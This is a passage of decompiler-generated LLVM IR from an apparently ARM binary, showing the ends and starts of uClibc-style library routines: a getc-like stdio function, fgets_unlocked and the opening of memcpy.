dec_label_pc_17ea0:                               ; preds = %dec_label_pc_17e90
  store i32 128, i32* @r1, align 4
  %v0_17ea4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_17ea4, i32* %r0.global-to-local, align 4
  %v2_17ea8 = icmp eq i32 %v0_17ea4, 0
  br i1 %v2_17ea8, label %dec_label_pc_17ea0.dec_label_pc_17eb0_crit_edge, label %dec_label_pc_17f78

dec_label_pc_17ea0.dec_label_pc_17eb0_crit_edge:  ; preds = %dec_label_pc_17ea0
  %v0_17eb0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17eb0

dec_label_pc_17eb0:                               ; preds = %dec_label_pc_17ea0.dec_label_pc_17eb0_crit_edge, %dec_label_pc_17e90
  %v2_17ef0 = phi i32 [ %v0_17eb0.pre, %dec_label_pc_17ea0.dec_label_pc_17eb0_crit_edge ], [ %v0_17e68, %dec_label_pc_17e90 ]
  %v1_17eb0 = inttoptr i32 %v2_17ef0 to i16*
  %v2_17eb0 = load i16, i16* %v1_17eb0, align 2
  %v3_17eb0 = zext i16 %v2_17eb0 to i32
  store i32 %v3_17eb0, i32* %r2.global-to-local, align 4
  %v1_17eb4 = and i32 %v3_17eb0, 2
  %v2_17eb4 = icmp eq i32 %v1_17eb4, 0
  br i1 %v2_17eb4, label %dec_label_pc_17ee0, label %dec_label_pc_17ebc

dec_label_pc_17ebc:                               ; preds = %dec_label_pc_17eb0
  %tmp26 = urem i16 %v2_17eb0, 2
  %v1_17ebc = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_17ebc
  %v4_17ec0 = and i32 %tmp22, 4
  %v5_17ec0 = add i32 %v4_17ec0, %v2_17ef0
  %v1_17ec4 = add i32 %v5_17ec0, 36
  %v2_17ec4 = inttoptr i32 %v1_17ec4 to i8*
  %v3_17ec4 = load i8, i8* %v2_17ec4, align 1
  %v4_17ec4 = zext i8 %v3_17ec4 to i32
  %v1_17ec8 = add nsw i32 %v3_17eb0, -1
  store i32 %v1_17ec8, i32* %r2.global-to-local, align 4
  store i32 %v4_17ec4, i32* %r0.global-to-local, align 4
  %v2_17ed4 = add i32 %v2_17ef0, 40
  %v3_17ed4 = inttoptr i32 %v2_17ed4 to i32*
  store i32 0, i32* %v3_17ed4, align 4
  %v0_17ed8 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ed8 = trunc i32 %v0_17ed8 to i16
  %v2_17ed8 = load i32, i32* @r4, align 4
  %v3_17ed8 = inttoptr i32 %v2_17ed8 to i16*
  store i16 %v1_17ed8, i16* %v3_17ed8, align 2
  br label %dec_label_pc_17f7c

dec_label_pc_17ee0:                               ; preds = %dec_label_pc_17eb0
  %v1_17ee0 = add i32 %v2_17ef0, 16
  %v1_17ee4 = inttoptr i32 %v1_17ee0 to i32*
  %v2_17ee4 = load i32, i32* %v1_17ee4, align 4
  store i32 %v2_17ee4, i32* @r1, align 4
  %v3_17ee4 = add i32 %v2_17ef0, 20
  %v4_17ee4 = inttoptr i32 %v3_17ee4 to i32*
  %v5_17ee4 = load i32, i32* %v4_17ee4, align 4
  %v9_17ee8 = icmp eq i32 %v5_17ee4, %v2_17ee4
  br i1 %v9_17ee8, label %dec_label_pc_17ef8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17ee0
  %v2_17eec = inttoptr i32 %v2_17ee4 to i8*
  %v3_17eec = load i8, i8* %v2_17eec, align 1
  %v4_17eec = zext i8 %v3_17eec to i32
  store i32 %v4_17eec, i32* %r0.global-to-local, align 4
  %v6_17eec = add i32 %v2_17ee4, 1
  store i32 %v6_17eec, i32* @r1, align 4
  store i32 %v6_17eec, i32* %v1_17ee4, align 4
  br label %dec_label_pc_17f7c

dec_label_pc_17ef8:                               ; preds = %dec_label_pc_17ee0
  %v1_17ef8 = add i32 %v2_17ef0, 4
  %v2_17ef8 = inttoptr i32 %v1_17ef8 to i32*
  %v3_17ef8 = load i32, i32* %v2_17ef8, align 4
  %v7_17efc = icmp eq i32 %v3_17ef8, -2
  br i1 %v7_17efc, label %.thread7, label %dec_label_pc_17f10

.thread7:                                         ; preds = %dec_label_pc_17ef8
  %v2_17f00 = or i16 %v2_17eb0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_17f00, i16* %v1_17eb0, align 2
  br label %dec_label_pc_17f7c

dec_label_pc_17f10:                               ; preds = %dec_label_pc_17ef8
  %v1_17f10 = and i32 %v3_17eb0, 768
  %v2_17f10 = icmp eq i32 %v1_17f10, 0
  br i1 %v2_17f10, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_17f10
  %v1_17f18 = load i32, i32* @r5, align 4
  %v3_17f18 = add i32 %v1_17f18, 76
  %v4_17f18 = inttoptr i32 %v3_17f18 to i32*
  %v5_17f18 = load i32, i32* %v4_17f18, align 4
  store i32 %v5_17f18, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17f10, %bb23
  store i32 98080, i32* @lr, align 4
  %v1_17f1c = xor i1 %v2_17f10, true
  call void @__pseudo_cond_branch(i1 %v1_17f1c, i32 ptrtoint (i32* @global_var_17ab8.746 to i32))
  %v0_17f20 = load i32, i32* @r4, align 4
  %v1_17f20 = add i32 %v0_17f20, 8
  store i32 %v1_17f20, i32* %r2.global-to-local, align 4
  %v1_17f24 = inttoptr i32 %v1_17f20 to i32*
  %v2_17f24 = load i32, i32* %v1_17f24, align 4
  store i32 %v2_17f24, i32* %r2.global-to-local, align 4
  %v3_17f24 = add i32 %v0_17f20, 12
  %v4_17f24 = inttoptr i32 %v3_17f24 to i32*
  %v5_17f24 = load i32, i32* %v4_17f24, align 4
  %v9_17f28 = icmp eq i32 %v5_17f24, %v2_17f24
  br i1 %v9_17f28, label %dec_label_pc_17f5c, label %dec_label_pc_17f30

dec_label_pc_17f30:                               ; preds = %.thread9
  %v2_17f30 = add i32 %v0_17f20, 24
  %v3_17f30 = inttoptr i32 %v2_17f30 to i32*
  store i32 %v2_17f24, i32* %v3_17f30, align 4
  %v0_17f34 = load i32, i32* @r4, align 4
  store i32 %v0_17f34, i32* %r0.global-to-local, align 4
  %v2_17f38 = call i32 @__stdio_rfill(i32 %v0_17f34)
  store i32 %v2_17f38, i32* %r0.global-to-local, align 4
  %v2_17f3c = icmp eq i32 %v2_17f38, 0
  br i1 %v2_17f3c, label %dec_label_pc_17f78, label %dec_label_pc_17f44

dec_label_pc_17f44:                               ; preds = %dec_label_pc_17f30
  %v0_17f44 = load i32, i32* @r4, align 4
  %v1_17f44 = add i32 %v0_17f44, 20
  %v2_17f44 = inttoptr i32 %v1_17f44 to i32*
  %v3_17f44 = load i32, i32* %v2_17f44, align 4
  %v2_17f48 = add i32 %v0_17f44, 24
  %v3_17f48 = inttoptr i32 %v2_17f48 to i32*
  store i32 %v3_17f44, i32* %v3_17f48, align 4
  %v0_17f4c = load i32, i32* @r4, align 4
  %v1_17f4c = add i32 %v0_17f4c, 16
  %v2_17f4c = inttoptr i32 %v1_17f4c to i32*
  %v3_17f4c = load i32, i32* %v2_17f4c, align 4
  %v1_17f50 = inttoptr i32 %v3_17f4c to i8*
  %v2_17f50 = load i8, i8* %v1_17f50, align 1
  %v3_17f50 = zext i8 %v2_17f50 to i32
  store i32 %v3_17f50, i32* %r0.global-to-local, align 4
  %v5_17f50 = add i32 %v3_17f4c, 1
  store i32 %v5_17f50, i32* %v2_17f4c, align 4
  br label %dec_label_pc_17f7c

dec_label_pc_17f5c:                               ; preds = %.thread9
  %v1_17f5c = inttoptr i32 %v0_17f20 to i16*
  store i32 %v0_17f20, i32* %r0.global-to-local, align 4
  %v2_17f60 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_17f60, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_17f68 = call i32 @__stdio_READ(i16* %v1_17f5c, i32 %v2_17f60, i32 1)
  store i32 %v5_17f68, i32* %r0.global-to-local, align 4
  %v2_17f6c = icmp eq i32 %v5_17f68, 0
  br i1 %v2_17f6c, label %dec_label_pc_17f78, label %bb24

bb24:                                             ; preds = %dec_label_pc_17f5c
  %v4_17f70 = load i8, i8* %stack_var_-17, align 1
  %v5_17f70 = sext i8 %v4_17f70 to i32
  store i32 %v5_17f70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f7c

dec_label_pc_17f78:                               ; preds = %dec_label_pc_17f5c, %dec_label_pc_17ea0, %dec_label_pc_17f30
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f7c

dec_label_pc_17f7c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_17f44, %dec_label_pc_17ebc, %dec_label_pc_17f78
  %v2_17f80 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17f80, i32* @r4, align 4
  store i32 %v6_17e64, i32* @r5, align 4
  store i32 %v9_17e64, i32* @lr, align 4
  %v1_17f84 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17f84

; uselistorder directives
  uselistorder i32 %v2_17ee4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17ef0, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_17e68, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17f7c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_17f78, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_17f90 = load i32, i32* @r6, align 4
  %v12_17f90 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17f94 = icmp eq i32 %arg2, 0
  store i1 %v2_17f94, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1801c, label %dec_label_pc_18004.preheader

dec_label_pc_18004.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_180042 = add i32 %arg2, -1
  store i32 %v1_180042, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_180048 = icmp eq i32 %arg2, 1
  store i1 %v7_180048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_180048, label %dec_label_pc_1800c, label %dec_label_pc_17fb0

dec_label_pc_17fb0:                               ; preds = %dec_label_pc_18004.preheader, %dec_label_pc_18004.backedge.dec_label_pc_17fb0_crit_edge
  %v0_17fd4 = phi i32 [ %v0_17fb0.pre, %dec_label_pc_18004.backedge.dec_label_pc_17fb0_crit_edge ], [ %arg3, %dec_label_pc_18004.preheader ]
  %v1_17fb0 = add i32 %v0_17fd4, 16
  %v2_17fb0 = inttoptr i32 %v1_17fb0 to i32*
  %v3_17fb0 = load i32, i32* %v2_17fb0, align 4
  store i32 %v3_17fb0, i32* %r2.global-to-local, align 4
  %v1_17fb4 = add i32 %v0_17fd4, 24
  %v2_17fb4 = inttoptr i32 %v1_17fb4 to i32*
  %v3_17fb4 = load i32, i32* %v2_17fb4, align 4
  store i32 %v3_17fb4, i32* %r3.global-to-local, align 4
  %v3_17fb8 = icmp uge i32 %v3_17fb0, %v3_17fb4
  store i1 %v3_17fb8, i1* %cpsr_c.global-to-local, align 1
  %v9_17fb8 = icmp eq i32 %v3_17fb0, %v3_17fb4
  store i1 %v9_17fb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17fb8, label %dec_label_pc_17fd4, label %dec_label_pc_17fc0

dec_label_pc_17fc0:                               ; preds = %dec_label_pc_17fb0
  %v1_17fc0 = inttoptr i32 %v3_17fb0 to i8*
  %v2_17fc0 = load i8, i8* %v1_17fc0, align 1
  %v3_17fc0 = zext i8 %v2_17fc0 to i32
  store i32 %v3_17fc0, i32* %r3.global-to-local, align 4
  %v5_17fc0 = add i32 %v3_17fb0, 1
  store i32 %v5_17fc0, i32* %r2.global-to-local, align 4
  %v2_17fc4 = load i32, i32* @r5, align 4
  %v3_17fc4 = inttoptr i32 %v2_17fc4 to i8*
  store i8 %v2_17fc0, i8* %v3_17fc4, align 1
  %v4_17fc4 = load i32, i32* @r5, align 4
  %v5_17fc4 = add i32 %v4_17fc4, 1
  store i32 %v5_17fc4, i32* @r5, align 4
  %v0_17fc8 = load i32, i32* %r3.global-to-local, align 4
  %v2_17fc8 = icmp ugt i32 %v0_17fc8, 9
  store i1 %v2_17fc8, i1* %cpsr_c.global-to-local, align 1
  %v7_17fc8 = icmp eq i32 %v0_17fc8, 10
  store i1 %v7_17fc8, i1* %cpsr_z.global-to-local, align 1
  %v0_17fcc = load i32, i32* %r2.global-to-local, align 4
  %v1_17fcc = load i32, i32* @r4, align 4
  %v2_17fcc = add i32 %v1_17fcc, 16
  %v3_17fcc = inttoptr i32 %v2_17fcc to i32*
  store i32 %v0_17fcc, i32* %v3_17fcc, align 4
  br i1 %v7_17fc8, label %dec_label_pc_1800c, label %dec_label_pc_18004.backedge

dec_label_pc_17fd4:                               ; preds = %dec_label_pc_17fb0
  %v1_17fd4 = inttoptr i32 %v0_17fd4 to i16*
  %v3_17fd8 = call i32 @getc_unlocked(i16* %v1_17fd4)
  %v3_17fdc = icmp eq i32 %v3_17fd8, -1
  store i1 %v3_17fdc, i1* %cpsr_c.global-to-local, align 1
  %v8_17fdc = icmp eq i32 %v3_17fd8, -1
  store i1 %v8_17fdc, i1* %cpsr_z.global-to-local, align 1
  %v1_17fe0 = urem i32 %v3_17fd8, 256
  store i32 %v1_17fe0, i32* %r3.global-to-local, align 4
  br i1 %v3_17fdc, label %dec_label_pc_17fe8, label %dec_label_pc_18000

dec_label_pc_17fe8:                               ; preds = %dec_label_pc_17fd4
  %v0_17fe8 = load i32, i32* @r4, align 4
  %v1_17fe8 = inttoptr i32 %v0_17fe8 to i16*
  %v2_17fe8 = load i16, i16* %v1_17fe8, align 2
  %v3_17fe8 = zext i16 %v2_17fe8 to i32
  store i32 %v3_17fe8, i32* %r3.global-to-local, align 4
  %v1_17fec = and i32 %v3_17fe8, 8
  %v2_17fec = icmp eq i32 %v1_17fec, 0
  store i1 %v2_17fec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17fec, label %dec_label_pc_1800c, label %dec_label_pc_1801c

dec_label_pc_18000:                               ; preds = %dec_label_pc_17fd4
  %v1_17ff8 = trunc i32 %v3_17fd8 to i8
  %v2_17ff8 = load i32, i32* @r5, align 4
  %v3_17ff8 = inttoptr i32 %v2_17ff8 to i8*
  store i8 %v1_17ff8, i8* %v3_17ff8, align 1
  %v4_17ff8 = load i32, i32* @r5, align 4
  %v5_17ff8 = add i32 %v4_17ff8, 1
  store i32 %v5_17ff8, i32* @r5, align 4
  %v0_17ffc = load i32, i32* %r3.global-to-local, align 4
  %v2_17ffc = icmp ugt i32 %v0_17ffc, 9
  store i1 %v2_17ffc, i1* %cpsr_c.global-to-local, align 1
  %v7_17ffc = icmp eq i32 %v0_17ffc, 10
  store i1 %v7_17ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17ffc, label %dec_label_pc_1800c, label %dec_label_pc_18004.backedge

dec_label_pc_18004.backedge:                      ; preds = %dec_label_pc_18000, %dec_label_pc_17fc0
  %v0_18004 = load i32, i32* @r6, align 4
  %v1_18004 = add i32 %v0_18004, -1
  store i32 %v1_18004, i32* @r6, align 4
  %v2_18004 = icmp ne i32 %v0_18004, 0
  store i1 %v2_18004, i1* %cpsr_c.global-to-local, align 1
  %v7_18004 = icmp eq i32 %v0_18004, 1
  store i1 %v7_18004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18004, label %dec_label_pc_1800c, label %dec_label_pc_18004.backedge.dec_label_pc_17fb0_crit_edge

dec_label_pc_18004.backedge.dec_label_pc_17fb0_crit_edge: ; preds = %dec_label_pc_18004.backedge
  %v0_17fb0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17fb0

dec_label_pc_1800c:                               ; preds = %dec_label_pc_18000, %dec_label_pc_18004.backedge, %dec_label_pc_17fc0, %dec_label_pc_18004.preheader, %dec_label_pc_17fe8
  %v0_1800c = load i32, i32* @r5, align 4
  %v1_1800c = load i32, i32* @r7, align 4
  %v3_1800c = icmp uge i32 %v0_1800c, %v1_1800c
  store i1 %v3_1800c, i1* %cpsr_c.global-to-local, align 1
  %v9_1800c = icmp eq i32 %v0_1800c, %v1_1800c
  store i1 %v9_1800c, i1* %cpsr_z.global-to-local, align 1
  %v2_18010 = xor i1 %v9_1800c, true
  %v3_18010 = and i1 %v3_1800c, %v2_18010
  br i1 %v3_18010, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1800c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_18014 = inttoptr i32 %v0_1800c to i8*
  store i8 0, i8* %v7_18014, align 1
  %v0_18018.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_18018.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1800c, %bb
  %v1_18018 = phi i1 [ %v1_18018.pre, %bb ], [ %v9_1800c, %dec_label_pc_1800c ]
  %v0_18018 = phi i1 [ %v0_18018.pre, %bb ], [ %v3_1800c, %dec_label_pc_1800c ]
  %v2_18018 = xor i1 %v1_18018, true
  %v3_18018 = and i1 %v0_18018, %v2_18018
  br i1 %v3_18018, label %.dec_label_pc_18020_crit_edge, label %dec_label_pc_1801c

.dec_label_pc_18020_crit_edge:                    ; preds = %.thread14
  %v0_18020.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18020

dec_label_pc_1801c:                               ; preds = %entry, %dec_label_pc_17fe8, %.thread14
  br label %dec_label_pc_18020

dec_label_pc_18020:                               ; preds = %.dec_label_pc_18020_crit_edge, %dec_label_pc_1801c
  %v0_18020 = phi i32 [ %v0_18020.pre, %.dec_label_pc_18020_crit_edge ], [ 0, %dec_label_pc_1801c ]
  store i32 %v9_17f90, i32* @r6, align 4
  store i32 %v12_17f90, i32* @r7, align 4
  ret i32 %v0_18020

; uselistorder directives
  uselistorder i1 %v9_1800c, { 1, 0, 2 }
  uselistorder i32 %v1_1800c, { 1, 0 }
  uselistorder i32 %v0_1800c, { 0, 2, 1 }
  uselistorder i32 %v0_18004, { 2, 0, 1 }
  uselistorder i32 %v0_17ffc, { 1, 0 }
  uselistorder i32 %v3_17fd8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_17fc8, { 1, 0 }
  uselistorder i32 %v3_17fb0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17fd4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_18020, { 1, 0 }
  uselistorder label %dec_label_pc_1801c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1800c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_17fb0, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_18030 = load i32, i32* @r1, align 4
  %v1_18030 = load i32, i32* @r0, align 4
  %v2_18030 = sub i32 %v0_18030, %v1_18030
  %v3_18030 = icmp ult i32 %v0_18030, %v1_18030
  %v4_18030 = xor i32 %v1_18030, %v0_18030
  %v5_18030 = xor i32 %v2_18030, %v0_18030
  %v6_18030 = and i32 %v5_18030, %v4_18030
  %v7_18030 = icmp slt i32 %v6_18030, 0
  store i1 %v7_18030, i1* %cpsr_v.global-to-local, align 1
  %v8_18030 = icmp slt i32 %v2_18030, 0
  store i1 %v8_18030, i1* %cpsr_n.global-to-local, align 1
  %v9_18030 = icmp eq i32 %v0_18030, %v1_18030
  store i1 %v9_18030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18030, label %dec_label_pc_18284, label %dec_label_pc_18038

dec_label_pc_18038:                               ; preds = %entry
  br i1 %v9_18030, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_18038
  %merge = phi i32 [ %v0_18030, %dec_label_pc_18038 ], [ %v2_18318, %bb150 ], [ %v11_18334, %bb153 ], [ %v7_18334, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_18038
  %v5_1803c = inttoptr i32 %v1_18030 to i8*
  store i8* %v5_1803c, i8** %stack_var_-8, align 4
  %v8_1803c = load i32, i32* @lr, align 4
  %v0_18040 = load i32, i32* @r2, align 4
  %v2_18040 = add i32 %v0_18040, -4
  store i32 %v2_18040, i32* %r2.global-to-local, align 4
  %v4_18040 = sub i32 3, %v0_18040
  %v5_18040 = and i32 %v4_18040, %v0_18040
  %v6_18040 = icmp slt i32 %v5_18040, 0
  store i1 %v6_18040, i1* %cpsr_v.global-to-local, align 1
  %v7_18040 = icmp slt i32 %v2_18040, 0
  store i1 %v7_18040, i1* %cpsr_n.global-to-local, align 1
  %v8_18040 = icmp eq i32 %v0_18040, 4
  store i1 %v8_18040, i1* %cpsr_z.global-to-local, align 1
  %v5_18044 = icmp slt i32 %v0_18040, 4
  br i1 %v5_18044, label %bb140, label %dec_label_pc_18048

dec_label_pc_18048:                               ; preds = %bb
  %v1_18048 = urem i32 %v1_18030, 4
  store i32 %v1_18048, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18048 = icmp eq i32 %v1_18048, 0
  store i1 %v2_18048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18048, label %dec_label_pc_18050, label %dec_label_pc_180fc

dec_label_pc_18050:                               ; preds = %dec_label_pc_18048
  %v1_18050 = urem i32 %v0_18030, 4
  store i32 %v1_18050, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18050 = icmp eq i32 %v1_18050, 0
  store i1 %v2_18050, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_18030 to i2
  br i1 %v2_18050, label %dec_label_pc_18058, label %dec_label_pc_1812c

dec_label_pc_18058:                               ; preds = %dec_label_pc_18050, %dec_label_pc_18124
  %v0_1807094 = phi i32 [ %v1_18030, %dec_label_pc_18050 ], [ %v0_1824c77, %dec_label_pc_18124 ]
  %v0_1806c93 = phi i32 [ %v0_18030, %dec_label_pc_18050 ], [ %v0_18124, %dec_label_pc_18124 ]
  %v0_18058 = phi i32 [ %v2_18040, %dec_label_pc_18050 ], [ %v2_1811c, %dec_label_pc_18124 ]
  %v1_18058 = add i32 %v0_18058, -8
  store i32 %v1_18058, i32* %r2.global-to-local, align 4
  %v3_18058 = sub i32 7, %v0_18058
  %v4_18058 = and i32 %v3_18058, %v0_18058
  %v5_18058 = icmp slt i32 %v4_18058, 0
  store i1 %v5_18058, i1* %cpsr_v.global-to-local, align 1
  %v6_18058 = icmp slt i32 %v1_18058, 0
  store i1 %v6_18058, i1* %cpsr_n.global-to-local, align 1
  %v7_18058 = icmp eq i32 %v0_18058, 8
  store i1 %v7_18058, i1* %cpsr_z.global-to-local, align 1
  %v2_1805c = xor i1 %v6_18058, %v5_18058
  br i1 %v2_1805c, label %dec_label_pc_180ac, label %dec_label_pc_18060

dec_label_pc_18060:                               ; preds = %dec_label_pc_18058
  %v1_18060 = add i32 %v0_18058, -28
  store i32 %v1_18060, i32* %r2.global-to-local, align 4
  %v3_18060 = sub i32 27, %v0_18058
  %v4_18060 = and i32 %v3_18060, %v1_18058
  %v5_18060 = icmp slt i32 %v4_18060, 0
  store i1 %v5_18060, i1* %cpsr_v.global-to-local, align 1
  %v6_18060 = icmp slt i32 %v1_18060, 0
  store i1 %v6_18060, i1* %cpsr_n.global-to-local, align 1
  %v7_18060 = icmp eq i32 %v1_18058, 20
  store i1 %v7_18060, i1* %cpsr_z.global-to-local, align 1
  %v2_18064 = xor i1 %v6_18060, %v5_18060
  br i1 %v2_18064, label %dec_label_pc_18098, label %dec_label_pc_18068

dec_label_pc_18068:                               ; preds = %dec_label_pc_18060
  %v0_18068 = load i32, i32* @r4, align 4
  store i32 %v0_18068, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1806c

dec_label_pc_1806c:                               ; preds = %dec_label_pc_1806c.dec_label_pc_1806c_crit_edge, %dec_label_pc_18068
  %v0_18070 = phi i32 [ %v12_18078, %dec_label_pc_1806c.dec_label_pc_1806c_crit_edge ], [ %v0_1807094, %dec_label_pc_18068 ]
  %v0_1806c = phi i32 [ %v0_1806c.pre, %dec_label_pc_1806c.dec_label_pc_1806c_crit_edge ], [ %v0_1806c93, %dec_label_pc_18068 ]
  %v1_1806c = inttoptr i32 %v0_1806c to i32*
  %v2_1806c = load i32, i32* %v1_1806c, align 4
  %v3_1806c = add i32 %v0_1806c, 4
  %v4_1806c = inttoptr i32 %v3_1806c to i32*
  %v5_1806c = load i32, i32* %v4_1806c, align 4
  store i32 %v5_1806c, i32* %r4.global-to-local, align 4
  %v6_1806c = add i32 %v0_1806c, 8
  %v7_1806c = inttoptr i32 %v6_1806c to i32*
  %v8_1806c = load i32, i32* %v7_1806c, align 4
  store i32 %v8_1806c, i32* %ip.global-to-local, align 4
  %v9_1806c = add i32 %v0_1806c, 12
  %v10_1806c = inttoptr i32 %v9_1806c to i32*
  %v11_1806c = load i32, i32* %v10_1806c, align 4
  store i32 %v11_1806c, i32* %lr.global-to-local, align 4
  %v12_1806c = add i32 %v0_1806c, 16
  store i32 %v12_1806c, i32* %r1.global-to-local, align 4
  %v1_18070 = inttoptr i32 %v0_18070 to i32*
  store i32 %v2_1806c, i32* %v1_18070, align 4
  %v3_18070 = add i32 %v0_18070, 4
  %v4_18070 = inttoptr i32 %v3_18070 to i32*
  %v5_18070 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18070, i32* %v4_18070, align 4
  %v6_18070 = add i32 %v0_18070, 8
  %v7_18070 = inttoptr i32 %v6_18070 to i32*
  %v8_18070 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_18070, i32* %v7_18070, align 4
  %v9_18070 = add i32 %v0_18070, 12
  %v10_18070 = inttoptr i32 %v9_18070 to i32*
  %v11_18070 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18070, i32* %v10_18070, align 4
  %v12_18070 = add i32 %v0_18070, 16
  store i32 %v12_18070, i32* %r0.global-to-local, align 4
  %v0_18074 = load i32, i32* %r1.global-to-local, align 4
  %v1_18074 = inttoptr i32 %v0_18074 to i32*
  %v2_18074 = load i32, i32* %v1_18074, align 4
  store i32 %v2_18074, i32* @r3, align 4
  %v3_18074 = add i32 %v0_18074, 4
  %v4_18074 = inttoptr i32 %v3_18074 to i32*
  %v5_18074 = load i32, i32* %v4_18074, align 4
  store i32 %v5_18074, i32* %r4.global-to-local, align 4
  %v6_18074 = add i32 %v0_18074, 8
  %v7_18074 = inttoptr i32 %v6_18074 to i32*
  %v8_18074 = load i32, i32* %v7_18074, align 4
  store i32 %v8_18074, i32* @ip, align 4
  %v9_18074 = add i32 %v0_18074, 12
  %v10_18074 = inttoptr i32 %v9_18074 to i32*
  %v11_18074 = load i32, i32* %v10_18074, align 4
  store i32 %v11_18074, i32* %lr.global-to-local, align 4
  %v12_18074 = add i32 %v0_18074, 16
  store i32 %v12_18074, i32* @r1, align 4
  %v1_18078 = inttoptr i32 %v12_18070 to i32*
  store i32 %v2_18074, i32* %v1_18078, align 4
  %v3_18078 = add i32 %v0_18070, 20
  %v4_18078 = inttoptr i32 %v3_18078 to i32*
  %v5_18078 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18078, i32* %v4_18078, align 4
  %v6_18078 = add i32 %v0_18070, 24
  %v7_18078 = inttoptr i32 %v6_18078 to i32*
  %v8_18078 = load i32, i32* @ip, align 4
  store i32 %v8_18078, i32* %v7_18078, align 4
  %v9_18078 = add i32 %v0_18070, 28
  %v10_18078 = inttoptr i32 %v9_18078 to i32*
  %v11_18078 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18078, i32* %v10_18078, align 4
  %v12_18078 = add i32 %v0_18070, 32
  store i32 %v12_18078, i32* @r0, align 4
  %v0_1807c = load i32, i32* %r2.global-to-local, align 4
  %v1_1807c = add i32 %v0_1807c, -32
  store i32 %v1_1807c, i32* %r2.global-to-local, align 4
